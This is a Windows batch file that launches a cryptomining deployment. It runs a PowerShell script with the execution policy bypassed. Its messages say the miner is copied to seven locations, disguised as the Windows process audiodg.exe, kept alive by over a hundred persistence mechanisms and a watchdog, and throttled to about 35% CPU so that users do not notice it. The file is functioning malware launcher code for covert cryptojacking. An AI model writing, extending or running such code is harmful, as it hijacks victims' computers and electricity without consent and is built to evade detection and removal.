@echo off
title DEPLOY NOW - SIMPLIFIED
color 0A

echo ================================================================
echo  DEPLOY NOW - ALL FEATURES ENABLED
echo  Fixed: No more false "failed to start" errors!
echo ================================================================
echo.
echo This will:
echo  - Deploy to 7 locations
echo  - Stealth rename to audiodg.exe
echo  - Install 100+ persistence mechanisms
echo  - Start miner with watchdog
echo  - Run in safe mode (35%% CPU, no lag)
echo.
pause

echo.
echo Starting deployment...
echo.

powershell.exe -ExecutionPolicy Bypass -File "%~dp0DEPLOY_ULTIMATE.ps1"

echo.
echo ================================================================
echo  Deployment script finished!
echo ================================================================
echo.
echo Check Task Manager for "xmrig.exe" or "audiodg.exe"
echo.
echo Expected behavior:
echo  - Miner runs at 30-35%% CPU
echo  - No lag during normal use
echo  - Watchdog restarts if stopped
echo.
pause
